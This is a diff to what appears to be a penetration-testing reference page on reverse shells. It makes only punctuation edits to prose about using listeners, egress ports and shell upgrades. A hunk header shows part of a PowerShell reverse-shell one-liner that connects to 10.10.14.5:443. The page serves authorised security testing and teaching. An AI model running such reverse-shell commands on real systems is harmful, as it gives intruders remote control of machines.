@@ -16,7 +16,7 @@ references:
 
 ## When to reach for it
 
-Exploitation gives you one command. You want a shell. Pick a payload the target can run, point it at your listener, and catch it. Prefer an outbound-friendly port (443) — egress filtering often allows it.
+Exploitation gives you one command. You want a shell. Pick a payload the target can run, point it at your listener, and catch it. Prefer an outbound-friendly port (443): egress filtering often allows it.
 
 ## Start a listener
 
@@ -47,4 +47,4 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.
 
 ## Notes
 
-A reverse shell beats a bind shell on most networks (the target dials out, so inbound firewall rules do not block it). The caught shell is dumb — no job control, no tab completion; on Linux, upgrade it (see the shell upgrade technique). Treat these one-liners as a reference and type the one you understand; only against systems you are authorised to test.
+A reverse shell beats a bind shell on most networks (the target dials out, so inbound firewall rules do not block it). The caught shell is dumb: no job control, no tab completion; on Linux, upgrade it (see the shell upgrade technique). Treat these one-liners as a reference and type the one you understand; only against systems you are authorised to test.
